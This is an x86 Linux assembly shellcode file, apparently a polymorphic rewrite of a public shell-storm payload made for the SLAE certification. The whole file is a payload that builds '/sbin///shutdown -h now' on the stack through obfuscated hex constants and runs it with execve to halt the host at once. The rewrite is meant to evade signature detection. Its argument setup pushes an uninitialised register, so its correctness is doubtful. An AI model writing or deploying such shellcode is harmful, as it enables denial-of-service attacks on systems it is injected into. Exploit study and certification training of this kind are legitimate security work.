; http://shell-storm.org/shellcode/files/shellcode-876.php
; Polymorphic version modified by @davidlebr1 for SLAE certification - 69 bytes

global _start

_start:
  cdq
  mul edx
  push  word 0x682d
  mov    edi, esp
  push   eax
  push   0x6e
  mov    WORD [esp+0x1],0x776f
  mov    edi, esp
  push   eax
  mov    dword [esp-4], 0x6e776f64
  mov    dword [esp-8], 0x74756873
  mov    dword [esp-12], 0x2f2f2f6e
  mov    dword [esp-16], 0x6962732f
  sub    esp, 16
  mov    ebx, esp
  push   edx
  push   esi
  push   edi
  push   ebx
  mov    ecx, esp
  mov    al, 0xb
  int    0x80
